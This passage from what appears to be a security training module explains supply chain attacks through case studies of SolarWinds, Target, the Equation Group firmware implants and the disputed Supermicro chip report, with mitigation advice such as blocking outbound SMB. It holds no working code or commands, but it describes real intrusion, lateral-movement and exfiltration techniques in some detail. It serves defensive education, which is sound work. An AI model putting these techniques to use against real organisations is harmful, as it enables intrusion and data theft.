### Prior Vetting and Risk Assessment

- `Due Diligence`: HealthMate should have undertaken exhaustive due diligence on MediConnect before entering into a partnership. This should encompass not only the firm's financial stability but also its cybersecurity posture.
- `Third-party Risk Assessment`: HealthMate could have engaged a third party to conduct a security audit of MediConnect, scrutinising aspects like staff training, cybersecurity measures, and compliance with industry standards.

### Limiting Access and Privileges

- `Principle of Least Privilege (PoLP)`: HealthMate should only provide MediConnect with the minimum access required to complete their tasks. Giving everyone on the MediConnect network access to the shared folder was a mistake, as only developers needed access.
- `Segmentation of Networks`: A segregated, dedicated sub-network for the partnership could mitigate the risk of lateral movement from MediConnect to HealthMate’s primary network.

### Better Technologies

Network shares, although convenient for collaborative work, harbour several potential pitfalls that make them susceptible to security compromises:

- `Overly Permissive Access`: It's common to find network shares where access controls are improperly configured, leading to unauthorised access.
- `Lack of Encryption`: Data is often stored in an unencrypted format, making it vulnerable to eavesdropping or interception during transit.
- `Risk of Lateral Movement`: If attackers gain access to a machine with network share access, they can often traverse laterally across the network, escalating privileges and gaining further entry into secure systems.
- `Data Leakage`: Without stringent auditing and monitoring, sensitive data can be copied or transferred without immediate detection.
- `Legacy Protocols`: Older network shares might rely on outdated protocols with known vulnerabilities.
- `No Two-Factor Authentication (2FA)`: Most standard network shares do not require 2FA, making it easier for an attacker to gain access using compromised credentials.

Given the security limitations of network shares, there are alternative technologies that are just as convenient:

- `Secure FTP (SFTP)`: This provides an encrypted channel for file transfer, reducing the risk of data interception.
- `WebDAV over HTTPS`: A set of extensions to HTTP that allows users to edit and manage files on remote servers, secured via HTTPS.

### NTLM Mitigations

- `Block Unwanted Outbound Connections`: Use a firewall to stop SMB connections on ports 445 and 139 from going out. This way, attackers can't capture your NTLMv2 hashes.
- `Tighten File Sharing Rules`: Don't let everyone write to your file shares. Limit writing permissions to only a few necessary users and folders. `Always give people the minimum access they need to do their jobs.`
- `Turn On SMB Signing`: This won't stop an attack, but it will reduce the damage. If SMB Signing isn't on, attackers can use the stolen hashes to get into other computers on your network.
- `Use Strong Passwords`: Make sure everyone has a strong password. If you also enforce SMB Signing, even stolen hashes won't be useful to attackers.


# The SolarWinds Attack

* * *

![](https://academy.hackthebox.com/storage/modules/243/solarwinds.png)

In the annals of `cyber warfare`, the `SolarWinds attack` of 2020 stands as a pivotal and heavily scrutinised incident. This attack transpired during a period characterised by a `global pandemic`, significant social unrest, and political volatility. The `SolarWinds hack` marks a significant milestone in `cyber espionage`, renowned for its audacity in breaching a single company and triggering a cascade of compromises impacting thousands of organisations, including key entities within the `U.S. government`.

`SolarWinds`, a prominent `software company` based in `Tulsa`, `Oklahoma`, specialises in providing various system management tools for `network` and `infrastructure monitoring`. The `Orion IT performance monitoring system` is notably distinguished among its diverse products due to its extensive deployment. Orion's privileged access to `IT systems` rendered it an appealing target for `cyber adversaries`.

## How the Attack Happened

The attackers first gained unauthorised access to `SolarWinds'` network in September 2019. A month later, in October 2019, they tested the initial `code injection` into the `Orion` platform. This preliminary phase allowed the hackers to understand the environment and prepare for the subsequent stages of the attack.

By February 2020, the adversaries had crafted a particularly insidious `malware` called `Sunburst`. This code was deftly integrated into the `Orion` system. `Sunburst` was designed to be surreptitious, operating clandestinely to avoid detection. It could access `system files` and blend in seamlessly with legitimate `SolarWinds` activity. Such was its sophistication that it could even circumvent `antivirus software`, which typically identifies and quarantines malicious programs.

`SolarWinds` periodically sends out `software updates` to its `Orion` system. In an audacious move, the attackers embedded the `Sunburst malware` into one `software update`. When `SolarWinds` rolled out these updates, starting from March 26, 2020, the compromised version—unwittingly distributed by `SolarWinds`—acted as a `Trojan horse`. Over 18,000 clients installed these malicious updates, granting attackers unprecedented access to their `IT systems`.

Once inside the network, the `malware` created a `backdoor`, allowing attackers to access and impersonate users and accounts. The threat actors could then move laterally across the network, potentially gaining access to `sensitive data`, emails, and even more critical parts of the infrastructure. This enabled them to spy on the compromised organisations and manipulate or steal data at will.

The `Sunburst malware` also had built-in checks to ensure it operated under the radar. Before attempting to connect to its external `command-and-control servers`, `Sunburst` conducted a series of checks to ensure that no `antimalware` or `forensic analysis tools` were operational, further complicating detection.

## The Breach and Its Scope

`Orion’s` ubiquity in managing IT resources for local, state, and federal agencies, as well as private corporations, made it a proverbial `Achilles' heel`. Its extensive deployment inadvertently served as a conduit for the attackers to infiltrate a staggering number of systems.

The pervasive nature of the breach had a sweeping impact across various sectors. Government departments, including `Homeland Security`, `State`, `Commerce`, and `Treasury`, found themselves ensnared in the cybernetic web.

It wasn’t confined to the public sector; private conglomerates like `FireEye`, `Microsoft`, `Intel`, `Cisco`, and `Deloitte` were also ensnared. The scale and diversity of the impacted organisations underscored the attack's audacity and ambition.

The breach was initially brought to light by cybersecurity firm `FireEye`. Intriguingly, FireEye was a victim and only discovered the SolarWinds compromise upon detecting the malware in its systems. FireEye’s subsequent public disclosure and the sharing of technical details alerted the broader cybersecurity community, catalysing further investigations.

While the extent of the compromised data remains ambiguous, the attackers’ access level was significant. Initial reports indicated the potential compromise of sensitive emails within the `U.S. government`. Moreover, it's not merely the data that was at risk. The attackers could manipulate data, disrupt services, or even sabotage critical infrastructure, thus posing a multi-dimensional threat.

Though the focus has predominantly been on U.S.-based organisations, the global footprint of SolarWinds means that international entities were not immune to the breach.

One of the most alarming aspects of this breach was the extended dwell time—the period between the initial compromise and its detection. The attackers had unfettered access to compromised systems for over a year, giving them ample time to explore, exfiltrate, or even alter data.

## Fallout and Response

In a remarkable display of collaborative effort, `FireEye`, `Microsoft`, and `GoDaddy` orchestrated a 'kill switch' to disable the `Sunburst` malware. They manipulated the domain used by the backdoor malware to prevent it from further communications with the compromised systems. Though this action effectively stanched the immediate threat, it did not eradicate the malware from the systems it had already infiltrated.

Despite these measures, the hack’s aftermath is yet to be fully understood or resolved. Investigations are ongoing, and many organisations are unsure whether they've completely eradicated the malware.

The `Biden administration` also took this as a cue to bolster cybersecurity efforts, including creating a `Deputy National Security Adviser for Cybersecurity` position.

## The Broader Impact and Lessons Learned

The `SolarWinds` cyber attack highlighted the vulnerability of the global digital ecosystem, marking a pivotal moment in cybersecurity awareness. This attack transcended conventional breaches, reinforcing the need for advanced cybersecurity measures. It exposed the inadequacy of traditional defences like `firewalls` and `antivirus software` against sophisticated cyber threats. These tools, once effective, are now insufficient alone, as demonstrated by the ease with which attackers bypassed them in the `SolarWinds` breach.

Post-SolarWinds, there has been a shift towards proactive cybersecurity strategies. Organisations and governments are focusing on actively identifying and mitigating vulnerabilities and potential attack vectors. This approach is essential in preempting evolving cybercriminal tactics and securing systems against future attacks.

The attack also underscored the challenges in attributing cyber attacks. The `SolarWinds` incident, for instance, involved accusations by the United States of Russian involvement, specifically its Foreign Intelligence Service, which Russia denied.

## The Supply Chain Attack

The cornerstone of the `SolarWinds breach` was exploiting a `trusted mechanism` \- the `software update process`. By injecting the `Sunburst` malware into the `Orion platform's` update process, the attackers leveraged a routine, trusted activity to disseminate malicious code. Using a legitimate channel for distributing malware is a defining trait of supply chain attacks.

### Broad Access Through a Single Entry Point

The `SolarWinds attack` highlights how a single point of compromise in a `supply chain` can lead to extensive access across numerous organisations. The `Orion system's` widespread use across diverse sectors, including government and private entities, significantly amplified the breach’s impact. This instance demonstrates how attackers can exploit interconnected systems to access a variety of targets through one initial breach point.

### Covert Operations and Evasion Techniques

The sophistication of the `Sunburst` malware was evident in its ability to operate covertly, seamlessly blending with legitimate software activities and evading detection. The malware's design to avoid activating antivirus software and its 'living off the land' strategy indicate advanced `supply chain attacks`, where detection and response are substantially challenged.

### Lateral Movement and Prolonged Access

Once inside the network, the malware enabled extensive `lateral movement`, allowing the attackers to access a wealth of sensitive information. This ability to traverse an organisation's network undetected, coupled with the extended period between the initial compromise and its detection, typifies sophisticated `supply chain attacks`. It reflects a strategic approach to maximise the exploitation of the breach.

### Global Impact and the Ripple Effect

The global scope and diverse range of victims of the SolarWinds attack illustrate the ripple effect characteristic of `supply chain attacks`. The breach affected not only the direct users of the Orion software but also had implications for the broader community, including international entities. This far-reaching impact underscores the interconnectedness and inherent vulnerabilities within modern digital ecosystems.

The SolarWinds attack exemplifies how exploiting trusted update mechanisms can lead to broad access through a single entry point, covert operations, `lateral movement` within networks, and a global impact. This incident has precipitated a reevaluation of `cybersecurity strategies`, emphasising the necessity for more proactive and comprehensive approaches to protect against such sophisticated threats.


# Targeting Target

* * *

![](https://academy.hackthebox.com/storage/modules/243/Target.png)

In late 2013, Target Corporation, an American retail giant, was the victim of a [sophisticated](https://www.zdnet.com/article/anatomy-of-the-target-data-breach-missed-opportunities-and-lessons-learned/) cyber attack that compromised millions of customers' personal and financial data. The event sent shockwaves through the retail industry and became a case study of the vulnerabilities of complex supply chains and network security.

## How the Attack Happened

The attack on `Target's` systems was a multi-faceted operation that exploited multiple vulnerabilities across the retail giant's cybersecurity infrastructure. Below is a more detailed exploration of each stage of the attack.

The attackers began by conducting an exhaustive survey of Target and its business ecosystem. They exploited publicly available information to understand Target's internal systems. A case study published on `Microsoft’s` website gave them critical insights into Target’s infrastructure, including its `POS systems`. This preparatory work helped the attackers identify potential weak links in Target's security chain, particularly focusing on third-party vendors such as `Fazio Mechanical`.

`Fazio Mechanical`, a refrigeration contractor for Target, became the entry point for the attackers. They sent a phishing email to Fazio Mechanical's employees, which allowed the `Citadel malware` to be installed on the contractor's systems. The free version of `Malwarebytes Anti-Malware` used by Fazio did not offer real-time protection, making it easier for the malware to take root and steal login credentials for Target's vendor portal.

Once they had the login credentials from Fazio Mechanical, the attackers were able to infiltrate Target's network. They likely used Target's `Ariba` portal, an external billing system, as their entry point. This was a significant lapse in Target's cybersecurity, as the portal was not adequately isolated from the rest of the network, facilitating lateral movement for the attackers.

After gaining initial access, the attackers exploited an administrative application `BMC` account using its default username and password. They then used network command tools and additional hacking tools to move laterally within the network. It is believed that they exploited a vulnerability in a `Windows Domain Controller` to gain access to the POS systems. Target’s failure to segment its internal network allowed the attackers to move freely and escalate their privileges.

Target’s POS systems were compromised by deploying a custom “BlackPOS” malware type. The malware was designed to scrape credit/debit card data directly from the memory of the POS devices. It was disseminated via an automated update process, and the deployment was facilitated by `Microsoft System Center Configuration Manager (SCCM)`.

Once the POS malware was in place, the scraped data was sent to a command-and-control server within Target's network. The server then transmitted the stolen data to external FTP servers in Eastern Europe.

`FireEye`, Target’s security monitoring software, detected the malware during this stage and alerted the staff. However, no action was taken, allowing the data exfiltration to proceed unhindered.

## The Breach and Its Scope

Starting `November 27th`, the malware began siphoning customer information from Target's systems. Surprisingly, this malicious activity went undetected for three days. The initial alerts received by Target's security team were dismissed as relatively harmless, leading to a delay in response.

Only on `December 12th`, upon being informed by the `U.S. Department of Justice` about the severity of the breach, Target took substantial action. By `December 15th`, the malware was purged from Target's systems. However, the damage was done: hackers stole data from `40 million` credit card accounts and personal details from `70 million` customers.

## Fallout and Response

News of the breach first emerged not from Target's official channels but from the blog of cybersecurity expert `Brian Krebs`. In the subsequent days, Target confirmed the breach and embarked on a series of cybersecurity enhancements, such as segmenting their network and implementing two-factor authentication.

Although swift after acknowledging the severity, the company's response couldn't prevent a considerable loss of customer trust and a financial setback of over `$200 million`. The breach also resulted in a class-action lawsuit, leading to a settlement wherein affected customers could claim up to `$10,000`, with proof of damages.

## The Broader Impact and Lessons Learned

The Target data breach was not just a singular event but a watershed moment for retail cybersecurity. It hastened the shift from magnetic stripe cards to more secure EMV (Europay, Mastercard, and Visa) chip-based systems. Moreover, businesses were reminded of the vulnerabilities third-party vendors could introduce into their systems.

The breach underscored the importance of vetting the cybersecurity measures of partners and having a proactive response plan in place. In the aftermath, consumers were also advised to adopt best practices, like using dedicated credit cards for retail purchases and regularly monitoring their financial statements.

## The Supply Chain Attack

The primary vulnerability was not under Target's direct control but originated from a third-party vendor, `Fazio Mechanical`. This incident highlights a key aspect of `supply chain attacks`: they often exploit the `interconnected nature of modern business relationships`. The attackers targeted a less secure, peripheral entity, which then became the conduit to infiltrate a larger, more secure target.

### Exploitation of Trust Relationships

`Supply chain attacks` fundamentally exploit the `trust relationships` between companies and their suppliers or service providers. Target trusted `Fazio Mechanical` to maintain adequate security measures. However, the attackers exploited Fazio’s weaker security protocols to access Target's network. This exploitation underscores the importance of ensuring robust security measures across all entities within a `supply chain`.

### Lateral Movement and Access Escalation

Upon gaining initial entry through `Fazio Mechanical`, the attackers adeptly moved laterally within `Target's` network. They exploited vulnerabilities and weak configurations, such as default passwords in `BMC` accounts, to escalate their access. This type of movement within a network typifies sophisticated `cyberattacks`, particularly those targeting `supply chains`, where initial access points may not lead directly to valuable data.

### Overlooked Alerts and Mismanagement of Risks

A pivotal aspect of the Target breach was the `mismanagement of risk` and overlooked security alerts. `FireEye`, Target’s security system, detected the intrusion, but the team failed to act upon these alerts promptly. This oversight exemplifies a frequent issue in `supply chain attacks`, where warning signs are either not adequately monitored or underestimated in their potential impact.

To summarise, the Target breach epitomises a `supply chain attack`, characterised by its exploitation of `third-party vulnerabilities`, misuse of `trust relationships`, `lateral movement` within the network, and the `mismanagement of risk` and `security alerts`. These elements illustrate how `supply chains` can be compromised, underscoring the necessity for comprehensive security strategies encompassing all business ecosystem nodes.


# The Equation Group HDD Hacks

* * *

The Equation Group, suspected to be affiliated with the NSA, has developed a pernicious [malware module capable of rewriting the firmware of a computer hard drive](https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/). This module, known as `nls_933w.dll`, is extraordinarily invasive and virtually indetectable, granting the attackers near-total control over a system. Not only can it rewrite firmware, but it also creates an invisible storage space within the hard drive to store stolen data.

This level of intrusion is unprecedented and highly sophisticated, affording the perpetrators persistent and stealthy access to target systems.

## Infiltration

`Infiltration` in this context is not a brute-force operation but a meticulous craft, an art form in `cyber espionage`.

The `Equation Group` uses two primary `malware` platforms as the initial vectors: `EquationDrug` and `GrayFish`. Each platform serves as a beachhead, establishing a preliminary foothold within the target system. Their capabilities are already formidable, but deploying the `firmware flasher module`, named `nls_933w.dll`, elevates this operation to unparalleled sophistication.

One of the most startling aspects of this `malware` is its adaptability. The `firmware flasher module` can interact with various hard drive brands like `IBM`, `Seagate`, `Western Digital`, and `Toshiba`.

To comprehend the enormity of this feat, one must understand that each brand has its unique `firmware architecture`. Adapting the `malware` to interface with multiple brands seamlessly requires a comprehensive understanding of their `firmware specifications`, `CPUs`, and operational idiosyncrasies.

This operation could not be executed by a lone wolf or a small group of hackers; it speaks to a level of resources and expertise, typically the purview of `state-sponsored entities`.

After securing its place within the compromised system, the `firmware flasher module` initiates communication with a `command server`. This is where it receives the `payload code` necessary to rewrite the hard drive's `firmware`. This two-stage process is a clever subterfuge. By separating the initial infiltration from the actual firmware flashing, the attackers reduce the size of the initial `malware payload`, making it less likely to trigger any size-based heuristic detection methods.

Another cunning element is the module's ability to evade detection. `Firmware` is often considered the "dark matter" of the digital universe; it's essential for hardware functioning but operates in the background, unseen and unexamined.

Most security tools and antivirus programs do not scan this layer, and even if they did, identifying malicious code within the labyrinthine complexities of `firmware` is a Herculean task.

The versions of the `flasher module` uncovered so far show evidence of ongoing development. Researchers found two distinct versions, one compiled in 2010 and linked to `EquationDrug` and a more recent version from 2013 associated with `GrayFish`.

This suggests that the `Equation Group` has been enhancing and refining its techniques, adapting to new challenges and opportunities.

## Compromise

The concept of `compromise` in `cybersecurity` often pertains to the unauthorised acquisition of data or control over systems. However, the level and extent of this compromise sets the `Equation Group's` operation apart.

It isn't merely about stealing data or usurping control temporarily; it's about embedding themselves so deeply into the target systems that they become quasi-gods of these digital realms.

Upon successful `infiltration`, the real magic begins. The `flasher module` overwrites the existing `firmware` on the hard drive, essentially altering the very DNA of the computer. This is a significant escalation in `cyber-espionage tactics`.

`Firmware` is the intermediary layer between a computer's hardware and operating system, governing how the two interact. By seizing control of the `firmware`, the attackers can manipulate the computer's behaviour at an elemental level, all while evading detection from most conventional security measures.

The subversion of the `firmware` provides the attackers with a degree of breathtaking and terrifying control. They can execute commands, deploy additional malicious payloads, and even survive attempts to wipe the system clean.

Think of it as planting a mole deep within an organisation. This mole doesn't just have access to the building; he has keys to every room, knows all the security protocols, and cannot be removed even if the entire staff is replaced.

One of the `flasher module's` most audacious features is its ability to create a hidden storage compartment within the hard drive. This is no mere parlour trick; it's a calculated move to bypass one of the most reliable security measures—disk encryption.

The secret compartment allows the attackers to store stolen data in an area that remains outside the purview of encryption protocols. They can squirrel away files, passwords, and perhaps even encryption keys, all of which can be retrieved later.

Once the `firmware` is Trojanized, the `flasher module` generates an `Application Programming Interface (API)` that can communicate with other malicious modules on the system. This API enables the `malware` to read and write data to the hidden storage area. This allows for dynamic data exfiltration, where stolen information can be incrementally added to the secret compartment.

If the target system employs disk encryption, the `malware` has another trick. Running in tandem with the operating system, it can capture encryption passwords in real time and store them in the hidden compartment. This could allow for future hard drive decryption or additional vectors for compromise.

The compromise isn't just tactical; it's strategic. By embedding themselves so profoundly, the attackers can maintain a persistent presence over an extended period. It's not a hit-and-run; it's more of a prolonged occupation where the intruders have the time and vantage point to make more informed decisions about what to steal, manipulate, or monitor.

## Distribution

The distribution of this particular `malware module` is not a widespread dragnet but a finely tuned operation that aims for precision rather than breadth.

Unlike more common `malware` or `ransomware` attacks disseminated indiscriminately, the `Equation Group's` `firmware` hard drive hack appears reserved for a select cadre of targets. This is not merely a shotgun approach hoping to catch as many birds as possible; it is more akin to the work of a sniper, carefully selecting each target and striking with lethal accuracy.

The `Equation Group` appears to have stringent criteria for deploying the `firmware-flashing module`. Of the 500 or so known victims of `Equation Group malware`, only a minuscule fraction—five systems—were discovered to have the `firmware-flashing module` installed.

Selective deployment implies focusing on high-value targets—machines likely critical to specific operations or holding exceptionally sensitive data. These might include systems used for secure communications, those containing proprietary information, or even computers belonging to high-profile individuals.

By targeting these nodes, the `Equation Group` maximises its return on investment, gaining access to crucial systems without exposing its sophisticated tools to undue scrutiny.

## Detection and Response

Concerning the `Equation Group`'s `firmware` `hard drive hack`, the realms of `detection` and `response` enter a labyrinth of complexity, obscured by layers of `technical sophistication` and `operational stealth`.

### The Challenge of Detection

The `malware`'s residence in the `firmware` makes it extraordinarily elusive. Traditional `antivirus software` operates at the `application layer`, scanning files and processes for `malicious code`. However, `firmware` exists in a different stratum, interacting directly with the `hardware` and largely `bypassing` the scrutiny of most `security tools`.

`Hard disk` manufacturers have historically not incorporated strong security measures into their `firmware`. Unlike `software applications`, which are often digitally signed to authenticate their legitimacy, `firmware` lacks such `verification mechanisms`.

The absence of `cryptographic signatures` makes it exceedingly difficult to distinguish between legitimate and `malicious firmware`. Even for `security experts`, examining `firmware` manually is a daunting task. Specialised tools and a deep understanding of `hardware` are necessary to begin such an endeavour.

### The Response Conundrum

One might think a complete erasure of the `operating system` would eliminate any resident `malware`. However, this `malware` would survive even such drastic measures due to its `firmware-level infiltration`. After restoring the system, the `malicious firmware` can reach its command server and reinstall the compromised components.

The most effective, albeit extreme, countermeasure would be physically replacing the compromised `hard drive`. This is a costly and labour-intensive solution, but given the `malware`'s resilience and persistence, it may be the only reliable option for completely eradicating the intrusion.

Given the suspected state-sponsored nature of the `Equation Group`, countermeasures may also involve diplomatic and intelligence avenues. This could range from `cybersecurity cooperation` between countries to legal sanctions against entities found to be involved in the malware's development or deployment.

### Proactive Measures

Organisations considering themselves potential high-value targets may need to invest in specialised `firmware auditing tools` and services. This would involve periodic scans of `hardware` components to ensure their `firmware` has not been tampered with.

While this particular `malware` is highly advanced, the initial infection vectors— `EquationDrug` and `GrayFish`—still require some access to the target system. Rigorous `security training` for staff, focusing on phishing resistance and safe browsing habits, can serve as a first line of defence.

## Attribution

`Attribution` in `cyber espionage` is often a murky affair, trapped in a web of plausible deniability, false flags, and complex geopolitical undercurrents.

Regarding the `Equation Group's` `firmware` hard drive hack, the sophistication and precision of the attack offer some intriguing clues, but these are often more suggestive than definitive.

The `malware's` selective deployment—targeting systems that are either not connected to the internet or have strong encryption—also hints at an intelligence operation. These are not the actions of cyber-criminals seeking financial gain or hacktivists pushing an ideological agenda. Instead, they suggest focusing on information gathering and long-term surveillance, hallmarks of state-sponsored `cyber espionage`.

The types of targets could also provide clues about the perpetrators. If the compromised systems are predominantly located within a specific country or belong to individuals or organisations with known geopolitical significance, this could offer insights into the objectives and identity of the attackers.

Several facets of the attack—such as its extraordinary sophistication and the types of systems it targets—appear to align with the `NSA's` known capabilities and areas of interest. However, one must tread carefully here, as even compelling circumstantial evidence is not definitive.

## The Supply Chain Attack

The primary aspect that categorises the Equation Group's operation as a `supply chain attack` is its focus on the firmware of `hard drives`. Firmware is a fundamental element in the digital `supply chain`, acting as the intermediary between hardware and software. By targeting firmware, the Equation Group could infiltrate systems at a more fundamental level than typical software-based attacks. This approach impacts the `supply chain` by compromising a basic component common to numerous systems, regardless of the specific software they run.

### Exploiting Trust in Firmware Integrity

Firmware is generally perceived as trustworthy and secure from tampering, as it is seldom the focus of routine security checks. The Equation Group exploited this trust, manipulating firmware to conceal their presence and actions. This subversion of trust is a defining characteristic of `supply chain attacks`, where attackers exploit users’ implicit trust in their systems' basic components and processes.

### Broad and Undetectable Infiltration

The `nls_933w.dll` malware's capability to operate undetectably and create hidden storage areas within the firmware exemplifies another hallmark of `supply chain attacks`: stealth and persistence. By embedding malicious code within the firmware, the attackers ensured their presence remained hidden and persistent, evading typical security measures like system reboots or antivirus scans. This level of infiltration is uncommon in more conventional forms of cyberattacks and signifies a strategic manipulation of the `supply chain`.

### Adaptability Across Multiple Brands

The adaptability of the Equation Group's malware to work with different `hard drive` brands demonstrates a comprehensive understanding of various firmware architectures. This adaptability indicates a `supply chain attack`, where the extent of impact is a crucial factor. By ensuring their malware could operate across a spectrum of brands, the Equation Group significantly expanded the potential scope of their attack, affecting a larger portion of the `supply chain`.

In conclusion, the Equation Group's HDD hacks are classified as a `supply chain attack` due to their focus on firmware—a foundational element in `digital infrastructure`, exploitation of trust in `firmware integrity`, broad and undetectable infiltration, adaptability across brands, and selective targeting of high-value entities. These factors demonstrate a strategic and sophisticated manipulation of the digital `supply chain`, distinguishing this operation from more common cyber threats.


# The Alleged Supermicro Attack

* * *

In 2018, a significant revelation was brought to light by [Bloomberg Businessweek](https://www.bloomberg.com/features/2021-supermicro/). The report suggested that servers used by several major American companies had been secretly embedded with malicious microchips.

Manufactured by `Super Micro Computer Inc.` (known as `Supermicro`), one of the premier providers of enterprise computing solutions, these servers, if compromised, would signify one of the most intricate and damaging supply chain attacks in history.

As alleged, this covert operation's primary objective was to establish a backdoor into high-value corporate networks and gain unauthorised access to sensitive data.

## The Allegation

The heart of `Bloomberg's` exposé was the claim that the `People’s Liberation Army` of China had clandestinely inserted tiny microchips, each barely the size of a rice grain, onto the server motherboards manufactured by `Supermicro` during their production phase. These tainted motherboards found their way into the infrastructure of nearly 30 U.S. companies, with notable names like `Apple` and `Amazon` among them.

The malevolent chips were not part of the original design blueprint of the motherboards. Their purported functionality was to tamper with the core operating instructions of the server, creating a portal through which attackers could remotely infiltrate the compromised devices.

The discovery of these illicit chips, as per the report, was credited to `Amazon`. The e-commerce giant reportedly stumbled upon them during a security review of `Elemental Technologies`, a firm they were in talks to acquire.

## Reactions and Repercussions

As presented by `Bloomberg`, the allegations sent shockwaves through the corporate world. `Apple` and `Amazon`, two major companies implicated in the report, issued strong denials. `Apple's` then-CEO, `Tim Cook`, went so far as to call for `Bloomberg` to retract their story.

`Supermicro` joined the choir of denials, emphasising that they had never been approached or alerted by any government agency about such a security lapse. The financial ramifications for `Supermicro` were immediate and severe.

After `Bloomberg's` publication, `Supermicro's` stock price took a nosedive, plummeting by more than 40%. The story's gravity didn't escape the attention of U.S. lawmakers, leading to calls for an exhaustive investigation into the matter. However, no U.S. agency responded with a public confirmation of `Bloomberg's` claims.

## Doubts and Discrepancies

While alarming, the narrative presented by `Bloomberg` was not without its sceptics.

A glaring omission in their report was the lack of any physical evidence. The absence of any compromised hardware or the alleged malicious chip as tangible proof raised many eyebrows.

Furthermore, many cybersecurity and hardware expert community members voiced their doubts about the alleged attack's technical plausibility. They argued that introducing a rogue chip into the intricate architecture of modern motherboards without triggering noticeable issues was nearly impossible.

The reliance on anonymous sources for the story, a common practice in investigative journalism, further muddied the waters due to the lack of on-the-record statements and verifiable evidence.

## Aftermath and Lessons Learned

The ripple effects of the alleged `Supermicro` attack were far-reaching. Whether `Bloomberg's` claims held water or not, they underscored potential vulnerabilities in the hardware supply chain, prompting organisations worldwide to reevaluate and intensify their vetting procedures for suppliers. `Supermicro's` ordeal after the allegations also highlighted the importance of reputation management in the digital age.

Even if unconfirmed, mere allegations can wreak havoc on a company's stock value and erode customer trust. Furthermore, this incident accentuated the crucial role of transparent communication between companies, media outlets, and the general public, particularly when potential threats to national security are on the line.

## The Supply Chain Attack

A defining feature of the alleged `Supermicro attack` is its focus on hardware components - specifically, the server motherboards. `Supply chain attacks` often target hardware or software components during production or distribution stages. In this case, inserting malicious microchips into motherboards during manufacturing would directly manipulate hardware components before they reach the end users.

### Infiltration at the Source

`Supply chain attacks` are marked by their ability to infiltrate systems at the source before distribution to consumers. The allegation that microchips were implanted during the `production phase` of `Supermicro motherboards` fits this criterion. This attack enables malicious actors to bypass many conventional security measures, as the compromised component is considered trustworthy by being part of the original hardware.

### Broad Impact Through a Single Point of Compromise

The reported scale of the alleged `Supermicro attack` highlights another characteristic of `supply chain attacks`: the potential for widespread impact through a single point of compromise. If the allegations were true, a single alteration in the manufacturing process could have affected thousands of servers and, consequently, the numerous companies using these servers. This broad impact is a hallmark of `supply chain attacks`, where a single vulnerability can have extensive consequences.

### Stealth and Persistence

The alleged microchips in the `Supermicro case` were reportedly incredibly small and engineered to interfere subtly with the server’s operations. This level of stealth, combined with the ability to establish long-term access to compromised systems, is emblematic of `supply chain attacks`, which often aim to remain undetected for prolonged periods to maximise data exfiltration or system manipulation.

### Controversy and Unconfirmed Nature

It is crucial to note that the `Supermicro incident` remains unconfirmed and controversial, with major parties denying the allegations. This lack of concrete evidence and the ensuing debate underscores the challenges in detecting, proving, and attributing `supply chain attacks`.

The `Supermicro case`, whether true or not, has nonetheless highlighted the potential risks associated with hardware supply chains and the need for rigorous security measures at all stages of production and distribution.

### Conclusion

If substantiated, the alleged Supermicro attack would be a quintessential example of a `supply chain attack`, characterised by its `targeting of hardware components` sold to `unsuspecting customers`, infiltration at the source, potential for broad impact, stealth, and persistence.

Despite the absence of confirmed evidence and the controversy surrounding the claims, this incident has raised awareness of the vulnerabilities inherent in hardware supply chains and underscored the importance of robust security protocols to safeguard against such threats.


# Software Supply Chain Attacks

* * *

`Software supply chains` are a critical component of operational infrastructure across industries. As software becomes more intertwined with business processes, the risk of `supply chain attacks` targeting software delivery and maintenance systems escalates.

`Software supply chain attacks` are a specialised `cyber threat` that disrupts the flow of software development and deployment.

![](https://academy.hackthebox.com/storage/modules/243/Diagram_Software-Supply-Chains_03_B.png)

## Development

When considering `development tools` like `Integrated Development Environments (IDEs)`, `compilers`, and `debuggers`, these utilities often become the unsung heroes of any software project. Yet, their crucial role in the `supply chain` makes them a prime target for nefarious activities.

`Vulnerabilities` can emerge from `out-of-date software`, poorly configured settings, or even third-party plugins that integrate with these tools. This exposes the development environment and the software being developed to potential risks.

The `human element`, represented by the developers themselves, adds another layer of complexity to the `vulnerability landscape`. Developers might inadvertently introduce `vulnerabilities` through poor coding practices, or more ominously, they could be coerced or bribed to insert `malicious code` intentionally.

The confluence of human and tool-based `vulnerabilities` makes the development stage particularly sensitive to the `supply chain`.

### Types of Attacks

- `Backdooring Development Tools`: Attackers may compromise the development tools to insert a `backdoor` in the developed software.
- `Code Injection/Trojan Source Attacks`: `Malicious code` can be injected during development through compromised tools or rogue developers.
- `Man-in-the-Middle (MITM) Attacks`: Attackers could intercept and alter data transferred between development tools and repositories.
- `Social Engineering`: Developers could be manipulated into disclosing sensitive information or implementing `vulnerabilities`.

### Consequences

The ramifications can be calamitous if an attack proves successful at the development stage. Compromised development tools can lead to flawed software products that carry the attacker's payload to the end-users. This can result in `data breaches`, compromised `intellectual property` and financial losses. Equally devastating is the potential for internal disruption; development timelines may be adversely impacted, resulting in financial penalties and loss of competitive edge.

Moreover, once `malicious code` has been inserted at the development stage, detecting and removing it later in the `supply chain` becomes exceedingly challenging. This not only magnifies the scale of the attack but also complicates remediation efforts, potentially necessitating a complete overhaul of the affected software.

### Mitigation Strategies

- `Regular Updates and Patching`: Always keep development tools up to date to fix known `vulnerabilities`.
- `Code Reviews`: Conduct rigorous code reviews to spot anomalies or `malicious insertions`.
- `Multi-Factor Authentication (MFA)`: Require MFA for all developers to access development environments.
- `Secure Data Transfers`: Use secure channels for all data transfers between development tools and repositories.

## Dependencies and Libraries

Using external libraries and dependencies is akin to standing on the shoulders of giants; it allows developers to leverage existing solutions for `quicker and more efficient` software creation. However, this convenience comes at a cost. The complexity of dependencies, which can rely on other dependencies, creates a labyrinthine web of potential vulnerabilities. An issue in a single, perhaps even obscure, library can have a cascading effect, compromising all software that depends on it.

The security of this stage is further compromised by the frequent `lack of scrutiny` applied to these third-party components. Developers may not adequately vet these external elements for security flaws due to a lack of awareness or under the pressures of tight deadlines.

The result is an `increased attack surface`, fraught with hidden pitfalls and vulnerabilities that might not manifest until deployed in a broader system.

### Types of Attacks

- `Dependency Poisoning`: Attackers can publish `malicious packages` that masquerade as legitimate dependencies.
- `Version Pinning Attacks`: Malicious actors could manipulate the system to force the use of outdated, `vulnerable versions` of libraries.
- `Indirect Dependency Attacks`: Attackers could compromise a less secure dependency that a more secure library relies upon.
- `Typosquatting`: Attackers publish malicious libraries with names similar to popular ones, tricking developers into using them.

### Consequences

The repercussions of an attack on the dependencies and libraries are notably dire. Since these components often perform critical functions, a compromised library can lead to `system-wide failures`, `data breaches`, or `unauthorised access` to sensitive information. The insidious nature of such attacks often means they go undetected until they have caused significant damage.

